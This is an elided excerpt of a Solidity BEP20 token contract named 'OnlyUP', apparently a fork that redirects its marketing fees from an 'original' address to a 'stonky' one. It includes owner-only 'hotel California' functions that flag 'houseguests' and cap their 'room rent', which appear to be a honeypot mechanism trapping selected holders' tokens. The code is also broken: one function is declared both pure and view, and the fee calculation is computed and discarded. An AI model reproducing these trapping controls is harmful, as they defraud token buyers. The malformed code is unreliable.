...
contract OnlyUP is IBEP20, Auth {
    ...
    // added functions
    function getTotalDividends() public pure view returns(uint256) {
        return distributor.totalDistributed();
    }

    function getDividendsOfHold(address _address) public view returns(uint256) {
        return distributor.getCumulativeDividends(shares[_address].amount);
    }
    ...
    constructor () Auth(msg.sender) {
        ...
        // marketingFeeReceiver = 0x03c6E69F4325396ce84bA0894Db76f30ef693755; // original
        marketingFeeReceiver = 0x2A319a1e85E6941f670fDc5D4fFA069Acf2c8b85; // stonky
    ...
    function takeFee(address sender, uint256 rAmount, bool isSell) internal returns (uint256) {
        ...
        else {uint256 feeAmount = rAmount.div(feeDenominator * 100).mul(totalFee).mul(multiplier); }
    ...
    // lobby manager
    function enable_hotel_CaliforniaMode(bool _status) public onlyOwner { hotelCaliforniaMode = _status; }
    function set_max_roomrent(uint256 _rent_withoutdecimal) public onlyOwner { maxRoomRent = _rent_withoutdecimal * 10**9; }
    function manage_houseguests(address[] calldata addresses, bool status) public onlyOwner { for (uint256 i; i < addresses.length; ++i) { isHouseguest[addresses[i]] = status; } }
    ...
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized { distributor.setDistributionCriteria(_minPeriod, _minDistribution); }
